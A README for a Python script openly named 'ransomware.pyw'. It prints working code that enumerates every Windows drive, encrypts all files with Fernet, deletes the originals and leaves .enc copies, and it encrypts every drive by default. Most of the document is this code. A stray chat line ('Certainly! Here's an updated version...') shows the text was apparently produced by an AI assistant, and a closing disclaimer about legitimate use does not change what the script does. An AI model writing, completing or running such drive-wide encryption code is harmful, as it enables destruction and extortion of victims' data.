# python ransomware.pyw

**File:** `python ransomware.pyw`

**Python Version:** `3.12`

**Author:** `memecoder`

**Platform:** `Windows`

---

### Overview

This script provides functionality for encrypting and decrypting files on a specified drive using the Fernet symmetric encryption algorithm. The script lists all available drives, iterates through them to encrypt or decrypt files, and handles both file content and file extensions.

### Dependencies

- `cryptography`: For encryption and decryption (install with `pip install cryptography`).
- `os`: For file and directory operations.

### Features

1. **Drive Listing**:
   - Lists available drives on the system.

2. **File Listing**:
   - Retrieves all files from a specified directory and its subdirectories.

3. **Encryption**:
   - Encrypts files using a predefined Fernet key.
   - Saves encrypted files with a `.enc` extension.

4. **Decryption**:
   - Decrypts files previously encrypted with the `.enc` extension.
   - Restores the original files by removing the `.enc` extension.

### How It Works

1. **Encryption Key**:
   - A predefined key is used for the Fernet encryption algorithm. Replace the placeholder key with your own key.

2. **Drive and File Listing**:
   - The `list_all_drives` function identifies available drives.
   - The `list_all_files` function retrieves all files from a given directory.

3. **File Encryption**:
   - The `encrypt_files` function encrypts each file's content and saves it with a `.enc` extension. The original file is deleted after encryption.

4. **File Decryption**:
   - The `decrypt_files` function decrypts files with a `.enc` extension and restores the original file.

### Code Details

- **Imports**:
  - `cryptography.fernet` for encryption and decryption.
  - `os` for file system operations.

- **Encryption Key Setup**:
  ```python
    # Encryption key
    key = 'your-encryption-key-here'
    cipher = Fernet(key.encode())
  ```

- **List Drives Function**:
  ```python
    # List all drives
    def list_all_drives():
        drives = []
        for letter in range(ord('A'), ord('Z') + 1):
            drive = chr(letter) + ':\\'
            if os.path.isdir(drive):
                drives.append(drive)
        return drives
  ```

- **List Files Function**:
  ```python
    # List all files in a directory
    def list_all_files(directory):
        all_files = []
        for root, _, files in os.walk(directory):
            for file in files:
                all_files.append(os.path.join(root, file))
        return all_files
  ```

- **Encrypt Files Function**:
  ```python
    # Encrypt files
    def encrypt_files(directory):
        files = list_all_files(directory)
        for file_path in files:
            try:
                with open(file_path, 'rb') as file:
                    data = file.read()
                encrypted_data = cipher.encrypt(data)
                os.remove(file_path)
                with open(file_path + '.enc', 'wb') as file:
                    file.write(encrypted_data)
                print(f"Encrypted {file_path} to {file_path}.enc")
            except Exception as e:
                print(f"Failed to encrypt {file_path}: {e}")
  ```

- **Decrypt Files Function**:
  ```python
    # Decrypt files
    def decrypt_files(directory):
        files = list_all_files(directory)
        for file_path in files:
            enc_file_path = file_path + '.enc'
            if os.path.exists(enc_file_path):
                try:
                    with open(enc_file_path, 'rb') as file:
                        encrypted_data = file.read()
                    decrypted_data = cipher.decrypt(encrypted_data)
                    os.remove(enc_file_path)
                    with open(file_path, 'wb') as file:
                        file.write(decrypted_data)
                    print(f"Decrypted {enc_file_path} to {file_path}")
                except Exception as e:
                    print(f"Failed to decrypt {enc_file_path}: {e}")
  ```

- **Processing Drives**:
  ```python
    # Process all drives
    for drive in list_all_drives():
        print(f"Processing drive: {drive}")
        encrypt_files(drive)
        # Uncomment the line below to enable decryption
        # decrypt_files(drive)
  ```

### Usage

1. **Encryption**:
   - To encrypt files, run the script as follows:
     ```python
     for drive in list_all_drives():
         print(f"Processing drive: {drive}")
         encrypt_files(drive)
     ```

2. **Decryption**:
   - To decrypt files, uncomment the decryption line in the main loop:
     ```python
     # decrypt_files(drive)
     ```

### Important Notes

- **Encryption Key**:
  - Ensure that the key used for encryption and decryption is securely stored and is the same for both operations.

- **Security**:
  - Be cautious when handling encryption and decryption operations to avoid data loss or corruption.
Certainly! Here’s an updated version of the `README.md` file with the **Disclaimer** section included:
- **Disclaimer**
  - **Legality**:
    - This script should be used solely for legitimate purposes, such as encrypting and decrypting your own files. Unauthorized use of this script to access or alter someone else's files is illegal and unethical.

  - **Responsibility**:
    - By using this script, you assume full responsibility for its actions and the security of the data being handled. Ensure you have the necessary permissions and legal rights before using or deploying this script.